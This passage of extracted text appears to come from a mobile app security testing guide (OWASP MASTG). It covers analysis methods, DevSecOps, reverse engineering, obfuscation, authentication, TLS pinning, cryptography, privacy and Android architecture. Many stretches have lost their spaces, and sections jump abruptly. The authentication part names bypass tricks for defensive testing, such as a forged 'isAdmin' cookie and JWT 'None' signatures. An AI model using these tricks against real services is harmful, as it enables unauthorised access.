A securityprofessionalmustthereforealwaysreviewtheresults. Thechapter“TestingTools”includesalistofstaticanalysistools,whichcanbefoundattheendofthisbook. Dynamic Analysis The focus of DAST is the testing and evaluation of apps via their real-time execution. The main objective of dynamic analysisisfindingsecurityvulnerabilitiesorweakspotsinaprogramwhileitisrunning. Dynamicanalysisisconducted bothatthemobileplatformlayerandagainstthebackendservicesandAPIs,wherethemobileapp’srequestandresponse patternscanbeanalyzed. Dynamic analysis is usually used to check for security mechanisms that provide sufficient protection against the most prevalenttypesofattack,suchasdisclosureofdataintransit,authenticationandauthorizationissues,andservercon- figurationerrors. 31\\nAvoiding False Positives Automated Scanning Tools Automatedtestingtools’lackofsensitivitytoappcontextisachallenge.

Issues such as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are reportedaccordingly. Let’stakeCSRFasanexample. AsuccessfulCSRFattackrequiresthefollowing: • Theabilitytoenticethelogged-inusertoopenamaliciouslinkinthewebbrowserusedtoaccessthevulnerable site. • Theclient(browser)mustautomaticallyaddthesessioncookieorotherauthenticationtokentotherequest. Mobile apps don’t fulfill these requirements: even if WebViews and cookie-based session management are used, any maliciouslinktheuserclicksopensinthedefaultbrowser,whichhasaseparatecookiestore. Stored Cross-Site Scripting (XSS) can be an issue if the app includes WebViews, and it may even lead to command executioniftheappexportsJavaScriptinterfaces. However,reflectedCross-SiteScriptingisrarelyanissueforthereason mentionedabove(eventhoughwhethertheyshouldexistatallisarguable,escapingoutputissimplyabestpractice). In any case, consider exploit scenarios when you perform the risk assessment; don’t blindly trust your scanning tool’soutput. Penetration Testing (a.k.a.

Thisislargelyaccomplishedviaextensivebuildautoma- tion, the process of testing and releasing software, and infrastructure changes (in addition to the collaboration aspect of DevOps). This automation is embodied in the deployment pipeline with the concepts of Continuous Integration and ContinuousDelivery(CI/CD). Peoplemayassumethattheterm“DevOps”representscollaborationbetweendevelopmentandoperationsteamsonly, however,asDevOpsthoughtleaderGeneKimputsit: “Atfirstblush,itseemsasthoughtheproblemsarejustbetween Devs and Ops, but test is in there, and you have informationsecurity objectives, and the need to protect systems and data.

Thissectionisfocusedonnecessaryinteractionsandintegratingsecurityintothedevelopmentlife cycle(whichstartswithprojectinceptionandendswiththedeliveryofvaluetousers). What Agile and DevSecOps Are and How Testing Activities Are Arranged Overview 38\\nAutomation is a key DevSecOps practice: as stated earlier, the frequency of deliveries from development to operation increaseswhencomparedtothetraditionalapproach,andactivitiesthatusuallyrequiretimeneedtokeepup,e.g.deliver the same added value while taking less time. Unproductive activities must consequently be abandoned, and essential tasksmustbefastened. Thesechangesimpactinfrastructurechanges,deployment,andsecurity: • infrastructureisbeingimplementedasInfrastructureasCode • deploymentisbecomingmorescripted,translatedthroughtheconceptsofContinuousIntegrationandContin- uousDelivery • securityactivitiesarebeingautomatedasmuchaspossibleandtakingplacethroughoutthelifecycle Thefollowingsectionsprovidemoredetailsaboutthesethreepoints.

InfrastructureasCodeiscommonlyusedforprojectsthathaveCloud-basedresourcesbecausemanyvendorsprovideAPIs thatcanbeusedforprovisioningitems(suchasvirtualmachines, storagespaces, etc.) andworkingonconfigurations (e.g., modifying memory sizes or the number of CPUs used by virtual machines).

Deployment Thedeploymentpipeline’ssophisticationdependsonthematurityoftheprojectorganizationordevelopmentteam. Inits simplestform,thedeploymentpipelineconsistsofacommitphase. Thecommitphaseusuallyinvolvesrunningsimple compiler checks and the unit test suite as well as creating a deployable artifact of the app. A release candidate is the latestversionthathasbeencheckedintothetrunkoftheversioncontrolsystem.

Adheringtothistimeconstraintisquitechallengingwhenitcomestosecuritybecause manysecuritytoolscan’tberunquicklyenough(#paul,#mcgraw). CI/CD means “Continuous Integration/Continuous Delivery” in some contexts and “Continuous Integration/Continuous Deployment”inothers. Actually,thelogicis: • ContinuousIntegrationbuildactions(eithertriggeredbyacommitorperformedregularly)useallsourcecodeto build a candidate release.

Forexample,anappmightrefusetorunonyourrootedtestdevice,makingitimpossibletorunsome ofyourtests. Insuchcases,you’llwanttoaltertheapp’sbehavior. Mobile security testers are served well by understanding basic reverse engineering concepts. They should also know mobile devices and operating systems inside out: processor architecture, executable format, programming language intricacies,andsoforth. Reverse engineering is an art, and describing its every facet would fill a whole library. The sheer range of techniques and specializations is mind-blowing: one can spend years working on a very specific and isolated sub-problem, such as automating malware analysis or developing novel de-obfuscation methods. Security testers are generalists; to be effectivereverseengineers,theymustfilterthroughthevastamountofrelevantinformation. There is no generic reverse engineering process that always works. That said, we’ll describe commonly used methods andtoolslaterinthisguide,andgiveexamplesoftacklingthemostcommondefenses.

The bad news is that dealing with multi-threaded anti-debugging controls, cryptographic white-boxes, stealthy anti- tampering features, and highly complex control flow transformations is not for the faint-hearted. The most effective software protection schemes are proprietary and won’t be beaten with standard tweaks and tricks. Defeating them re- quires tedious manual analysis, coding, frustration and, depending on your personality, sleepless nights and strained relationships. 42\\nIt’s easy for beginners to get overwhelmed by the sheer scope of reversing.

Butinpractice,therearemultiplepitfallssuchas: • Reliabledistinctionbetweencodeanddata. • Variableinstructionsize. • Indirectbranchinstructions. • FunctionswithoutexplicitCALLinstructionswithintheexecutable’scodesegment. • Positionindependentcode(PIC)sequences. • Handcraftedassemblycode. Similarly,decompilationisaverycomplicatedprocess,involvingmanydeterministicandheuristicbasedapproaches. Asa consequence,decompilationisusuallynotreallyaccurate,butneverthelessveryhelpfulingettingaquickunderstanding of the function being analyzed. The accuracy of decompilation depends on the amount of information available in the code being decompiled and the sophistication of the decompiler. In addition, many compilation and post-compilation tools introduce additional complexity to the compiled code in order to increase the difficulty of comprehension and/or evendecompilationitself. Suchcodereferredtoasobfuscatedcode. Overthepastdecadesmanytoolshaveperfectedtheprocessofdisassemblyanddecompilation,producingoutputwith high fidelity. Advanced usage instructions for any of the available tools can often easily fill a book of their own. The best way to get started is to simply pick up a tool that fits your needs and budget and get a well-reviewed user guide. Inthissection, wewillprovideanintroductiontosomeofthosetoolsandinthesubsequent“ReverseEngineeringand Tampering”AndroidandiOSchapterswe’llfocusonthetechniquesthemselves,especiallythosethatarespecifictothe platformathand. Obfuscation Obfuscationistheprocessoftransformingcodeanddatatomakeitmoredifficulttocomprehend(andsometimeseven difficult to disassemble). It is usually an integral part of the software protection scheme. Obfuscation isn’t something thatcanbesimplyturnedonoroff,programscanbemadeincomprehensible,inwholeorinpart,inmanywaysandto differentdegrees. Note: Allpresentedtechniquesbelowwillnotstopsomeonewithenoughtimeandbudgetfromreverseengineer- ing your app. However, combining these techniques will make their job significantly harder. The aim is thus to discouragereverseengineersfromperformingfurtheranalysisandnotmakingitworththeeffort. Thefollowingtechniquescanbeusedtoobfuscateanapplication: • Nameobfuscation • Instructionsubstitution • Controlflowflattening • Deadcodeinjection • Stringencryption • Packing Name Obfuscation The standard compiler generates binary symbols based on class and function names from the source code. Therefore, if no obfuscation is applied, symbol names remain meaningful and can easily be extracted from the app binary. For instance, afunctionwhichdetectsajailbreakcanbelocatedbysearchingforrelevantkeywords(e.g.“jailbreak”).

Instruction Substitution This technique replaces standard binary operators like addition or subtraction with more complex representations. For example,anadditionx = a + bcanberepresentedasx = -(-a) - (-b).

Debugging and Tracing Inthetraditionalsense,debuggingistheprocessofidentifyingandisolatingproblemsinaprogramaspartofthesoftware developmentlifecycle.

Debuggersenableprogramsuspensionatanypointduringruntime, inspectionoftheprocess’ internalstate,andevenregisterandmemorymodification. Theseabilitiessimplifyprograminspection. Debugging usually means interactive debugging sessions in which a debugger is attached to the running process. In contrast, tracing refers to passive logging of information about the app’s execution (such as API calls). Tracing can be doneinseveralways,includingdebuggingAPIs,functionhooks,andKerneltracingfacilities. Again,we’llcovermanyof thesetechniquesintheOS-specific“ReverseEngineeringandTampering”chapters.

Example: Program Analysis with Symbolic/Concolic Execution In the late 2000s, testing based on symbolic execution has become a popular way to identify security vulnerabilities. Symbolic “execution” actually refers to the process of representing possible paths through a program as formulas in first-order logic. Satisfiability Modulo Theories (SMT) solvers are used to check the satisfiability of these formulas and provide solutions, including concrete values of the variables needed to reach a certain point of execution on the path correspondingtothesolvedformula. Insimplewords,symbolicexecutionismathematicallyanalyzingaprogramwithoutexecutingit. Duringanalysis,each unknowninputisrepresentedasamathematicalvariable(asymbolicvalue),andhencealltheoperationsperformedon thesevariablesarerecordedasatreeofoperations(aka. AST(abstractsyntaxtree),fromcompilertheory). TheseASTs can be translated into so-called constraints that will be interpreted by a SMT solver. In the end of this analysis, a final mathematicalequationisobtained,inwhichthevariablesaretheinputswhosevaluesarenotknown. SMTsolversare specialprogramswhichsolvetheseequationstogivepossiblevaluesfortheinputvariablesgivenafinalstate.

Infact, theyconsistentlyranksecond highestintheOWASPTop10. Mostmobileappsimplementsomekindofuserauthentication. Eventhoughpartoftheauthenticationandstatemanage- mentlogicisperformedbythebackendservice,authenticationissuchanintegralpartofmostmobileapparchitectures thatunderstandingitscommonimplementationsisimportant. SincethebasicconceptsareidenticaloniOSandAndroid,we’lldiscussprevalentauthenticationandauthorizationarchi- tecturesandpitfallsinthisgenericguide. OS-specificauthenticationissues,suchaslocalandbiometricauthentication, willbediscussedintherespectiveOS-specificchapters. General Assumptions Appropriate Authentication is in Place Performthefollowingstepswhentestingauthenticationandauthorization: • Identifytheadditionalauthenticationfactorstheappuses. • Locateallendpointsthatprovidecriticalfunctionality. • Verifythattheadditionalfactorsarestrictlyenforcedonallserver-sideendpoints. Authenticationbypassvulnerabilitiesexistwhenauthenticationstateisnotconsistentlyenforcedontheserverandwhen the client can tamper with the state. While the backend service is processing requests from the mobile client, it must consistently enforce authorization checks: verifying that the user is logged in and authorized every time a resource is requested. ConsiderthefollowingexamplefromtheOWASPWebTestingGuide. Intheexample,awebresourceisaccessedthrough aURL,andtheauthenticationstateispassedthroughaGETparameter: http://www.site.com/page.asp?authenticated=no The client can arbitrarily change the GET parameters sent with the request. Nothing prevents the client from simply changingthevalueoftheauthenticatedparameterto“yes”,effectivelybypassingauthentication. Althoughthisisasimplisticexamplethatyouprobablywon’tfindinthewild,programmerssometimesrelyon“hidden” client-side parameters, such as cookies, to maintain authentication state. They assume that these parameters can’t be tampered with. Consider, for example, the following classic vulnerability in Nortel Contact Center Manager. The administrativewebapplicationofNortel’sappliancereliedonthecookie“isAdmin”todeterminewhetherthelogged-in user should be granted administrative privileges. Consequently, it was possible to get admin access by simply setting thecookievalueasfollows: isAdmin=True Security experts used to recommend using session-based authentication and maintaining session data on the server only. Thispreventsanyformofclient-sidetamperingwiththesessionstate. However,thewholepointofusingstateless authenticationinsteadofsession-basedauthenticationistonothavesessionstateontheserver. Instead,stateisstored inclient-sidetokensandtransmittedwitheveryrequest. Inthiscase,seeingclient-sideparameterssuchasisAdminis perfectlynormal. Topreventtamperingcryptographicsignaturesareaddedtoclient-sidetokens. Ofcourse,thingsmaygowrong,andpop- ularimplementationsofstatelessauthenticationhavebeenvulnerabletoattacks. Forexample,thesignatureverification ofsomeJSONWebToken(JWT)implementationscouldbedeactivatedbysettingthesignaturetypeto“None”. 50\\nBest Practices for Passwords Passwordstrengthisakeyconcernwhenpasswordsareusedforauthentication. Thepasswordpolicydefinesrequirements to which end users should adhere. A password policy typically specifies password length, password complexity, and passwordtopologies. A“strong”passwordpolicymakesmanualorautomatedpasswordcrackingdifficultorimpossible. ForfurtherinformationpleaseconsulttheOWASPAuthenticationCheatSheet. General Guidelines on Testing Authentication There’s no one-size-fits-all approach to authentication. When reviewing the authentication architecture of an app, you shouldfirstconsiderwhethertheauthenticationmethod(s)usedareappropriateinthegivencontext. Authenticationcan bebasedononeormoreofthefollowing: • Somethingtheuserknows(password,PIN,pattern,etc.) • Somethingtheuserhas(SIMcard,one-timepasswordgenerator,orhardwaretoken) • Abiometricpropertyoftheuser(fingerprint,retina,voice) The number of authentication procedures implemented by mobile apps depends on the sensitivity of the functions or accessedresources. Refertoindustrybestpracticeswhenreviewingauthenticationfunctions. Username/passwordau- thentication (combined with a reasonable password policy) is generally considered sufficient for apps that have a user loginandaren’tverysensitive. Thisformofauthenticationisusedbymostsocialmediaapps. Forsensitiveapps,addingasecondauthenticationfactorisusuallyappropriate. Thisincludesappsthatprovideaccessto verysensitiveinformation(suchascreditcardnumbers)orallowuserstotransferfunds. Insomeindustries,theseapps mustalsocomplywithcertainstandards. Forexample,financialappshavetoensurecompliancewiththePaymentCard IndustryDataSecurityStandard(PCIDSS),theGrammLeachBlileyAct,andtheSarbanes-OxleyAct(SOX).Compliance considerationsfortheUShealthcaresectorincludetheHealthInsurancePortabilityandAccountabilityAct(HIPAA)and thePatientSafetyRule. Stateful vs. Stateless Authentication You’ll usually find that the mobile app uses HTTP as the transport layer. The HTTP protocol itself is stateless, so there must be a way to associate a user’s subsequent HTTP requests with that user. Otherwise, the user’s log in credentials wouldhavetobesentwitheveryrequest. Also,boththeserverandclientneedtokeeptrackofuserdata(e.g.,theuser’s privilegesorrole). Thiscanbedoneintwodifferentways: • Withstatefulauthentication,auniquesessionidisgeneratedwhentheuserlogsin. Insubsequentrequests,this sessionIDservesasareferencetotheuserdetailsstoredontheserver. ThesessionIDisopaque;itdoesn’tcontain anyuserdata. • With stateless authentication, all user-identifying information is stored in a client-side token.

Authenticationshouldn’tbeimplementedfromscratchbutbuiltontopofprovenframeworks. Manypopularframeworks provide ready-made authentication and session management functionality. If the app uses framework APIs for authen- tication, check the framework security documentation for best practices.

Intheexampleabove,theheaderdecodesasfollows: {\"alg\":\"HS256\",\"typ\":\"JWT\"} The second part of the token is the payload, which contains so-called claims.

Forexample: {\"sub\":\"1234567890\",\"name\":\"JohnDoe\",\"admin\":true} ThesignatureiscreatedbyapplyingthealgorithmspecifiedintheJWTheadertotheencodedheader,encodedpayload, andasecretvalue. Forexample,whenusingtheHMACSHA256algorithmthesignatureiscreatedinthefollowingway: HMACSHA256(base64UrlEncode(header)+\".\"+base64UrlEncode(payload),secret) Note that the secret is shared between the authentication server and the backend service - the client does not know it. This proves that the token was obtained from a legitimate authentication service. It also prevents the client from tamperingwiththeclaimscontainedinthetoken. BestPractices: VerifythattheimplementationadherestoJWTbestpractices: • VerifythattheHMACischeckedforallincomingrequestscontainingatoken. • VerifythattheprivatesigningkeyorHMACsecretkeyisneversharedwiththeclient.

Otherwise the2FAcanbeeasilybypassedwithintheapp. The2FAcanbeperformedatloginorlaterintheuser’ssession. For example, after logging in to a banking app with a username and PIN, the user is authorized to perform non- sensitive tasks. Once the user attempts to execute a bank transfer, the second factor (“step-up authentication”) mustbepresented.

Consequently, network-based attacks (such as packet sniffing and man-in-the-middle-attacks) are a problem. In this chapter we discuss potential vulnera- bilities, testing techniques, and best practices concerning the network communication between mobile apps and their endpoints. Secure Connections The time has long passed since it was reasonable to use cleartext HTTP alone and it’s usually trivial to secure HTTP connectionsusingHTTPS.HTTPSisessentiallyHTTPlayeredontopofanotherprotocolknownasTransportLayerSecurity (TLS).AndTLSperformsahandshakeusingpublickeycryptographyand,whencomplete,createsasecureconnection. AnHTTPSconnectionisconsideredsecurebecauseofthreeproperties: • Confidentiality: TLSencryptsdatabeforesendingitoverthenetwork,whichmeansitcan’tbereadbyaninter- mediary. • Integrity: thedatacan’tbealteredwithoutdetection. • Authentication: theclientcanvalidatetheidentityoftheservertomakesuretheconnectionisestablishedwith thecorrectserver. Server Trust Evaluation CertificateAuthorities(CAs)areanintegralpartofasecureclientservercommunicationandtheyarepredefinedinthe truststoreofeachoperatingsystem. Forinstance,oniOStherearemorethan200rootcertificatesinstalled(seeApple documentation-AvailabletrustedrootcertificatesforAppleoperatingsystems) CAs can be added to the trust store, either manually by the user, by an MDM that manages the enterprise device or through malware. The question is then: “can you trust all of those CAs and should your app rely on the default trust store?”. Afterall,therearewell-knowncaseswherecertificateauthoritieshavebeencompromisedortrickedintoissuing certificatestoimpostors. AdetailedtimelineofCAbreachesandfailurescanbefoundatsslmate.com. BothAndroidandiOSallowtheusertoinstalladditionalCAsortrustanchors. AnappmaywanttotrustacustomsetofCAsinsteadoftheplatformdefault. Themostcommonreasonsforthisare: • Connectingtoahostwithacustomcertificateauthority(aCAthatisn’tknownortrustedbythesystemyet),such asaCAthatisself-signedorisissuedinternallywithinacompany. • LimitingthesetofCAstoaspecificlistoftrustedCAs. • TrustingadditionalCAsnotincludedinthesystem.

Pinninghasgainedabadreputationsinceitsintroductionseveralyearsago. We’dliketoclarifyacoupleofpointsthat arevalidatleastformobileapplicationsecurity: • The bad reputation is due to operational reasons (e.g. implementation/pin management complexity) not lack of security. • Ifanappdoesnotimplementpinning,thisshouldn’tbereportedasavulnerability. However,iftheappmustverify againstMASVS-L2itmustbeimplemented. • BothAndroidandiOSmakeimplementingpinningveryeasyandfollowthebestpractices. • PinningprotectsagainstacompromisedCAoramaliciousCAthatisinstalledonthedevice. Inthosecases,pinning willpreventtheOSfromestablishingasecureconnectionfrombeingestablishedwithamaliciousserver. However, ifanattackerisincontrolofthedevice,theycaneasilydisableanypinninglogicandthusstillallowtheconnection to happen. As a result, this will not prevent an attacker from accessing your backend and abusing server-side vulnerabilities. • Pinning in mobile apps is not the same as HTTP Public Key Pinning (HPKP). The HPKP header is no longer recom- mendedonwebsitesasitcanleadtousersbeinglockedoutofthewebsitewithoutanywaytorevertthelockout. For mobile apps, this is not an issue, as the app can always be updated via an out-of-band channel (i.e. the app store)incasethereareanyissues.

Thischapterprovidesanoutlineofcryptographic conceptsandbestpracticesrelevanttomobileapps. Thesebestpracticesarevalidindependentofthemobileoperating system. Key Concepts The goal of cryptography is to provide constant confidentiality, data integrity, and authenticity, even in the face of an attack. Confidentiality involves ensuring data privacy through the use of encryption. Data integrity deals with data consistencyanddetectionoftamperingandmodificationofdatathroughtheuseofhashing. Authenticityensuresthat thedatacomesfromatrustedsource. Encryptionalgorithmsconvertsplaintextdataintociphertextthatconcealstheoriginalcontent. Plaintextdatacanbe restoredfromtheciphertextthroughdecryption. Encryptioncanbesymmetric(encryption/decryptionwithsamesecret- key)orasymmetric(encryption/decryptionusingapublicandprivatekeypair). Ingeneral,encryptionoperationsdonot protectintegrity,butsomesymmetricencryptionmodesalsofeaturethatprotection. Symmetric-keyencryptionalgorithmsusethesamekeyforbothencryptionanddecryption. Thistypeofencryption isfastandsuitableforbulkdataprocessing. Sinceeverybodywhohasaccesstothekeyisabletodecrypttheencrypted content,thismethodrequirescarefulkeymanagementandcentralizedcontroloverkeydistribution. Public-keyencryptionalgorithmsoperatewithtwoseparatekeys: thepublickeyandtheprivatekey. Thepublickey can be distributed freely while the private key shouldn’t be shared with anyone. A message encrypted with the public key can only be decrypted with the private key and vice-versa. Since asymmetric encryption is several times slower than symmetric operations, it’s typically only used to encrypt small amounts of data, such as symmetric keys for bulk encryption. Hashingisn’taformofencryption,butitdoesusecryptography. Hashfunctionsdeterministicallymaparbitrarypiecesof dataintofixed-lengthvalues. It’seasytocomputethehashfromtheinput,butverydifficult(i.e.infeasible)todetermine theoriginalinputfromthehash. Additionally,thehashwillcompletelychangewhenevenasinglebitoftheinputchanges. Hashfunctionsareusedforintegrityverification,butdon’tprovideanauthenticityguarantee. Message Authentication Codes(MACs)combineothercryptographicmechanisms(suchassymmetricencryptionor hashes)withsecretkeystoprovidebothintegrityandauthenticityprotection. However,inordertoverifyaMAC,multiple entitieshavetosharethesamesecretkeyandanyofthoseentitiescangenerateavalidMAC.HMACs,themostcommonly usedtypeofMAC,relyonhashingastheunderlyingcryptographicprimitive. ThefullnameofanHMACalgorithmusually includestheunderlyinghashfunction’stype(forexample,HMAC-SHA256usestheSHA-256hashfunction). Signaturescombineasymmetriccryptography(thatis,usingapublic/privatekeypair)withhashingtoprovideintegrity and authenticity by encrypting the hash of the message with the private key. However, unlike MACs, signatures also providenon-repudiationpropertyastheprivatekeyshouldremainuniquetothedatasigner. Key Derivation Functions (KDFs) derive secret keys from a secret value (such as a password) and are used to turn keys into other formats or to increase their length. KDFs are similar to hashing functions but have other uses as well (forexample,theyareusedascomponentsofmulti-partykey-agreementprotocols). Whilebothhashingfunctionsand KDFs must be difficult to reverse, KDFs have the added requirement that the keys they produce must have a level of randomness. Identifying Insecure and/or Deprecated Cryptographic Algorithms When assessing a mobile app, you should make sure that it does not use cryptographic algorithms and protocols that havesignificantknownweaknessesorareotherwiseinsufficientformodernsecurityrequirements. Algorithmsthatwere consideredsecureinthepastmaybecomeinsecureovertime;therefore,it’simportanttoperiodicallycheckcurrentbest practicesandadjustconfigurationsaccordingly.

Forcriticalkeys,itisrecommendedtoconsiderimplementation ofalgorithmsrecognizedbyPasswordHashingCompetition(PHC)likeArgon2. Weak Random Number Generators It is fundamentally impossible to produce truly random numbers on any deterministic device. Pseudo-random number generators (RNG) compensate for this by producing a stream of pseudo-random numbers - a stream of numbers that appear as if they were randomly generated. The quality of the generated numbers varies with the type of algorithm used. CryptographicallysecureRNGsgeneraterandomnumbersthatpassstatisticalrandomnesstests,andareresilient againstpredictionattacks(e.g.itisstatisticallyinfeasibletopredictthenextnumberproduced). MobileSDKsofferstandardimplementationsofRNGalgorithmsthatproducenumberswithsufficientartificialrandomness.

Inadequate AES Configuration Advanced Encryption Standard (AES) is the widely accepted standard for symmetric encryption in mobile apps. It’s an iterative block cipher that is based on a series of linked mathematical operations. AES performs a variable number of roundsontheinput,eachofwhichinvolvesubstitutionandpermutationofthebytesintheinputblock. Eachrounduses a128-bitroundkeywhichisderivedfromtheoriginalAESkey. Asofthiswriting,noefficientcryptanalyticattacksagainstAEShavebeendiscovered. However,implementationdetails andconfigurableparameterssuchastheblockciphermodeleavesomemarginforerror.

Padding Oracle Attacks due to Weaker Padding or Block Operation Implementations In the old days, PKCS1.5 padding (in code: PKCS1Padding) was used as a padding mechanism when doing asymmet- ric encryption. This mechanism is vulnerable to the padding oracle attack. Therefore, it is best to use OAEP (Optimal Asymmetric Encryption Padding) captured in PKCS#1 v2.0 (in code: OAEPPadding, OAEPwithSHA-256andMGF1Padding, OAEPwithSHA-224andMGF1Padding, OAEPwithSHA-384andMGF1Padding, OAEPwithSHA-512andMGF1Padding). Note that, even when using OAEP, you can still run into an issue known best as the Manger’s attack as described in",

Static Analysis Security Testing Considerations Staticcodeanalysisoflow-levelcodeisacomplextopicthatcouldeasilyfillitsownbook. AutomatedtoolssuchasRATS combinedwithlimitedmanualinspectioneffortsareusuallysufficienttoidentifylow-hangingfruits. However, memory corruption conditions often stem from complex causes.

Bugs manifesting from deep instances of overlookedcodedeficienciesaregenerallydiscoveredthroughdynamicanalysisorbytesterswhoinvesttimetogaina deepunderstandingoftheprogram.

Memory Management Automatic Reference Counting ARC(AutomaticReferenceCounting)isamemorymanagementfeatureoftheClangcompilerexclusivetoObjective-Cand Swift. ARCautomaticallyfreesupthememoryusedbyclassinstanceswhenthoseinstancesarenolongerneeded. ARC differsfromtracinggarbagecollectioninthatthereisnobackgroundprocessthatdeallocatestheobjectsasynchronously atruntime. Unliketracinggarbagecollection,ARCdoesnothandlereferencecyclesautomatically. Thismeansthataslongasthere are“strong”referencestoanobject,itwillnotbedeallocated. Strongcross-referencescanaccordinglycreatedeadlocks andmemoryleaks.

Garbage Collection GarbageCollection(GC)isanautomaticmemorymanagementfeatureofsomelanguagessuchasJava/Kotlin/Dart. The garbage collector attempts to reclaim memory which was allocated by the program, but is no longer referenced—also called garbage. The Android runtime (ART) makes use of an improved version of GC.

The Challenge Therearetwomaindimensionstoconsiderhere: • DeveloperCompliance: Developersneedtocomplywithlegalprivacyprinciplessincetheyareenforcedbylaw. Developersneedtobettercomprehendthelegalprinciplesinordertoknowwhatexactlytheyneedtoimplement toremaincompliant. Ideally,atleast,thefollowingmustbefulfilled: – Privacy-by-Designapproach(Art. 25GDPR,“Dataprotectionbydesignandbydefault”). – PrincipleofLeastPrivilege(“Everyprogramandeveryuserofthesystemshouldoperateusingtheleast setofprivilegesnecessarytocompletethejob.”) • UserEducation: Usersneedtobeeducatedabouttheirsensitivedataandinformedabouthowtousetheappli- cationproperly(toensuresecurehandlingandprocessingoftheirinformation). Note: Moreoftenthannotappswillclaimtohandlecertaindata,butinrealitythat’snotthecase. TheIEEEarticle “EngineeringPrivacyin Smartphone Apps: A TechnicalGuideline Catalogfor App Developers” by Majid Hatamian givesaveryniceintroductiontothistopic. Protection Goals for Data Protection When an app needs personal information from a user for its business process, the user needs to be informed on what happenswiththedataandwhytheappneedsit. Ifthereisathirdpartydoingtheactualprocessingofthedata,theapp shouldinformtheuseraboutthattoo. Surelyyou’realreadyfamiliarwiththeclassictriadofsecurityprotectiongoals: confidentiality,integrity,andavailability. However,youmightnotbeawareofthethreeprotectiongoalsthathavebeenproposedtofocusondataprotection: • Unlinkability: – Users’privacy-relevantdatamustbeunlinkabletoanyothersetofprivacy-relevantdataoutsideofthedomain. – Includes: dataminimization,anonymization,pseudonymization,etc. • Transparency: 84\\n– Usersshouldbeabletorequestallinformationthattheapplicationhasonthem,andreceiveinstructionson howtorequestthisinformation. – Includes: privacypolicies,usereducation,properloggingandauditingmechanisms,etc. • Intervenability: – Usersshouldbeabletocorrecttheirpersonalinformation,requestitsdeletion,withdrawanygivenconsent atanytime,andreceiveinstructionsonhowtodoso. – Includes: privacy settings directly in the app, single points of contact for individuals’ intervention requests (e.g.in-appchat,telephonenumber,e-mail),etc. SeeSection5.1.1“Introductiontodataprotectiongoals”inENISA’s“Privacyanddataprotectioninmobileapplica- tions”formoredetaileddescriptions. Addressing both security and privacy protection goals at the same time is a very challenging task (if not impossible in many cases). There is an interesting visualization in IEEE’s publication Protection Goals for Privacy Engineering called “TheThreeAxes”representingtheimpossibilitytoensure100%ofeachofthesixgoalssimultaneously. Mostpartsoftheprocessesderivedfromtheprotectiongoalsaretraditionallycoveredinaprivacypolicy. However,this approachisnotalwaysoptimal: • developersarenotlegalexpertsbutstillneedtobecompliant. • userswouldberequiredtoreadusuallylongandwordypolicies. The New Approach (Google’s and Apple’s take on this) In order to address these challenges and help users easily understand how their data is being collected, handled, and shared, Google and Apple introduced new privacy labeling systems (very much along the lines of NIST’s proposal for ConsumerSoftwareCybersecurityLabeling: • theAppStoreNutritionLabels(since2020). • theGooglePlayDataSafetySection(since2021).

The following five key areas are dis- cussed: 1. Androidarchitecture 2. Androidsecurity: defense-in-depthapproach 3. Androidapplicationstructure 4. Androidapplicationpublishing 5. Androidapplicationattacksurface VisittheofficialAndroiddeveloperdocumentationwebsiteformoredetailsabouttheAndroidplatform. Android Architecture AndroidisaLinux-basedopensourceplatformdevelopedbytheOpenHandsetAlliance(aconsortiumleadbyGoogle), which serves as a mobile operating system (OS). Today the platform is the foundation for a wide variety of modern technology, such as mobile phones, tablets, wearable tech, TVs, and other smart devices. Typical Android builds ship witharangeofpre-installed(“stock”)appsandsupportinstallationofthird-partyappsthroughtheGooglePlaystoreand othermarketplaces. Android’s software stack is composed of several different layers. Each layer defines interfaces and offers specific ser- vices. 89\\nKernel: At the lowest level, Android is based on a variation of the Linux Kernel containing some significant additions, including Low Memory Killer, wake locks, the Binder IPC driver, etc. For the purpose of the MASTG, we’ll focus on the user-modepartoftheOS,whereAndroidsignificantlydiffersfromatypicalLinuxdistribution. Thetwomostimportant componentsforusarethemanagedruntimeusedbyapplications(ART/Dalvik)andBionic,Android’sversionofglibc,the GNUClibrary. HAL:Ontopofthekernel,theHardwareAbstractionLayer(HAL)definesastandardinterfaceforinteractingwithbuilt-in hardwarecomponents. SeveralHALimplementationsarepackagedintosharedlibrarymodulesthattheAndroidsystem calls when required. This is the basis for allowing applications to interact with the device’s hardware. For example, it allowsastockphoneapplicationtouseadevice’smicrophoneandspeaker. Runtime Environment: Android apps are written in Java and Kotlin and then compiled to Dalvik bytecode which can bethenexecutedusingaruntimethatinterpretsthebytecodeinstructionsandexecutesthemonthetargetdevice. For Android, thisistheAndroidRuntime(ART).ThisissimilartotheJVM(JavaVirtualMachine)forJavaapplications, orthe MonoRuntimefor.NETapplications. DalvikbytecodeisanoptimizedversionofJavabytecode. ItiscreatedbyfirstcompilingtheJavaorKotlincodetoJava bytecode,usingthejavacandkotlinccompilersrespectively,producing.classfiles. Finally,theJavabytecodeisconverted toDalvikbytecodeusingthed8tool. DalvikbytecodeispackedwithinAPKandAABfilesintheformof.dexfilesandis usedbyamanagedruntimeonAndroidtoexecuteitonthedevice. 90\\nBeforeAndroid5.0(APIlevel21),AndroidexecutedbytecodeontheDalvikVirtualMachine(DVM),whereitwastranslated intomachinecodeatexecutiontime,aprocessknownasjust-in-time(JIT)compilation. Thisenablestheruntimetobenefit fromthespeedofcompiledcodewhilemaintainingtheflexibilityofcodeinterpretation. SinceAndroid5.0(APIlevel21),AndroidexecutesbytecodeontheAndroidRuntime(ART)whichisthesuccessorofthe DVM.ARTprovidesimprovedperformanceaswellascontextinformationinappnativecrashreports,byincludingboth Javaandnativestackinformation. ItusesthesameDalvikbytecodeinputtomaintainbackwardcompatibility. However, ART executes the Dalvik bytecode differently, using a hybrid combination of ahead-of-time (AOT), just-in-time (JIT) and profile-guidedcompilation. • AOTpre-compilesDalvikbytecodeintonativecode,andthegeneratedcodewillbesavedondiskwiththe.oatexten- sion(ELFbinary). Thedex2oattoolcanbeusedtoperformthecompilationandcanbefoundat/system/bin/dex2oat onAndroiddevices. AOTcompilationisexecutedduringtheinstallationoftheapp. Thismakestheapplicationstart faster,asnocompilationisneededanymore. However,thisalsomeansthattheinstalltimeincreasesascompared toJITcompilation. Additionally,sinceapplicationsarealwaysoptimizedagainstthecurrentversionoftheOS,this meansthatsoftwareupdateswillrecompileallpreviouslycompiledapplications,resultinginasignificantincrease in the system update time. Finally, AOT compilation will compile the entire application, even if certain parts are neverusedbytheuser. • JIThappensatruntime. • Profile-guided compilationisahybridapproachthatwasintroducedinAndroid7(APIlevel24)tocombatthe downsidesofAOT.Atfirst, theapplicationwilluseJITcompilation, 